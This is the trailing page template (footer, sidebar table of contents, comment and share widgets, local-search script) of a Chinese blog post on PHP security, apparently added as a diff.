+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/代码审计/" rel="tag"># 代码审计</a>
+          
+            <a href="/tags/php/" rel="tag"># php</a>
+          
+            <a href="/tags/web安全/" rel="tag"># web安全</a>
+          
+            <a href="/tags/安全编码规范/" rel="tag"># 安全编码规范</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/08/14/mysql弱密码/" rel="next" title="hydra弱密码漏洞爆破和OpenVAS使用初探与mysql弱口令环境搭建">
+                <i class="fa fa-chevron-left"></i> hydra弱密码漏洞爆破和OpenVAS使用初探与mysql弱口令环境搭建
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/10/08/流密码攻击理论实践/" rel="prev" title="流密码攻击理论实践">
+                流密码攻击理论实践 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript">
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image" src="/uploads/109.jpg" alt="little potato">
+          <p class="site-author-name" itemprop="name">little potato</p>
+           
+              <p class="site-description motion-element" itemprop="description">The true man wants two things:danger and play.</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">24</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">22</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">39</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=857896&auto=0&height=66"></iframe>
+
+<div align="left" font-family:="" "arial","microsoft="" yahei","����","����",sans-serif="">
+
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/IversionBY" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="mailto:mini.lypto@gmail.com" target="_blank" title="GMail">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  GMail
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/littelpotato" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.xdsec.club/" title="XDSEC" target="_blank">XDSEC</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.anquanquan.info/" title="infor" target="_blank">infor</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.freebuf.com/" title="freebuf" target="_blank">freebuf</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </div></section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#请充分了解你的php"><span class="nav-number">1.</span> <span class="nav-text">请充分了解你的php</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#基本信息"><span class="nav-number">1.0.1.</span> <span class="nav-text">基本信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#敏感配置"><span class="nav-number">1.0.2.</span> <span class="nav-text">敏感配置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#关于危险函数"><span class="nav-number">1.0.3.</span> <span class="nav-text">关于危险函数</span></a></li></ol></li></ol><li class="nav-item nav-level-1"><a class="nav-link" href="#不要过分相信php"><span class="nav-number">2.</span> <span class="nav-text">不要过分相信php</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#弱类型"><span class="nav-number">2.0.1.</span> <span class="nav-text">弱类型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#全局注册变量"><span class="nav-number">2.0.2.</span> <span class="nav-text">全局注册变量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#一些常出现的“安全”函数"><span class="nav-number">2.0.3.</span> <span class="nav-text">一些常出现的“安全”函数</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#strip-tags"><span class="nav-number">2.0.3.0.0.1.</span> <span class="nav-text">strip_tags</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#htmlspecialchars"><span class="nav-number">2.0.3.0.0.2.</span> <span class="nav-text">htmlspecialchars</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#htmlentities"><span class="nav-number">2.0.3.0.0.3.</span> <span class="nav-text">htmlentities</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#escapeshellarg"><span class="nav-number">2.0.3.0.0.4.</span> <span class="nav-text">escapeshellarg</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#escaoeshellcmd"><span class="nav-number">2.0.3.0.0.5.</span> <span class="nav-text">escaoeshellcmd</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#is-uploaded-file"><span class="nav-number">2.0.3.0.0.6.</span> <span class="nav-text">is_uploaded_file</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#intval"><span class="nav-number">2.0.3.0.0.7.</span> <span class="nav-text">intval</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#fgetss"><span class="nav-number">2.0.3.0.0.8.</span> <span class="nav-text">fgetss</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#quotemeta"><span class="nav-number">2.0.3.0.0.9.</span> <span class="nav-text">quotemeta</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#stripslashes"><span class="nav-number">2.0.3.0.1.</span> <span class="nav-text">stripslashes</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#str-replace"><span class="nav-number">2.0.3.0.2.</span> <span class="nav-text">str_replace</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php内置协议-伪协议"><span class="nav-number">2.0.4.</span> <span class="nav-text">php内置协议(伪协议)</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#向DVWA学习php安全的代码编写"><span class="nav-number">3.</span> <span class="nav-text">向DVWA学习php安全的代码编写</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#sql注入"><span class="nav-number">3.1.</span> <span class="nav-text">sql注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CSRF"><span class="nav-number">3.1.1.</span> <span class="nav-text">CSRF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Command-Injection"><span class="nav-number">3.1.2.</span> <span class="nav-text">Command Injection</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Brute-Force"><span class="nav-number">3.1.3.</span> <span class="nav-text">Brute Force</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Local-File-Inclusion"><span class="nav-number">3.1.4.</span> <span class="nav-text">Local File Inclusion)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#upload-file"><span class="nav-number">3.1.5.</span> <span class="nav-text">upload file</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#XSS"><span class="nav-number">3.1.6.</span> <span class="nav-text">XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#反射型"><span class="nav-number">3.1.6.1.</span> <span class="nav-text">反射型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#存储型"><span class="nav-number">3.1.6.2.</span> <span class="nav-text">存储型</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考文献"><span class="nav-number">4.</span> <span class="nav-text">参考文献</span></a></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">
+  
+  &copy;  2017 - 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">little potato</span>
+</div>
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.3/jquery.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/jquery_lazyload/1.9.7/jquery.lazyload.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/velocity/1.3.1/velocity.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/velocity/1.3.1/velocity.ui.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.pack.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://iversion lee.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://yoursite.com/2018/09/05/浅谈php安全/';
+          this.page.identifier = '2018/09/05/浅谈php安全/';
+          this.page.title = '浅谈php安全';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://iversion lee.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+    
+    <script>
+      var cloudTieConfig = {
+        url: document.location.href, 
+        sourceId: "",
+        productKey: "a1fe7273de6e47ad9f9802a493c2cccf",
+        target: "cloud-tie-wrapper"
+      };
+    </script>
+    <script src="https://img1.ws.126.net/f2e/tie/yun/sdk/loader.js"></script>
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (search_path.endsWith("json")) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+  
+
+  
+
+</div></body></html>
